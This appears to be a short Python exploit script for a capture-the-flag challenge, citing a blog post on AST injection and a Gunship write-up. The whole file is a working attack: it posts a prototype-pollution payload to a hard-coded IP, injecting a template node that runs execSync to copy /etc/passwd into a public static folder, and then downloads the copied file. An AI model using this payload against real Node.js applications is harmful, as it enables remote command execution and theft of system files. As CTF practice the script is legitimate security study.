#!/usr/bin/python3

## https://blog.p6.is/AST-Injection/
## https://sec.stealthcopter.com/htb-ctf-write-up-gunship/
###############

import os,sys,re
## lol
################################
##
##

import requests

target = 'http://178.128.160.242:32270'

r = requests.post(target + '/api/submit', json = {
"artist.name":"Westaway",
    "__proto__.block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync(`cat /etc/passwd > /app/static/whatever`)"
    }
})

print (r.status_code)
print (r.text)
print (requests.get(target+'/static/whatever').text)

###############
##
##
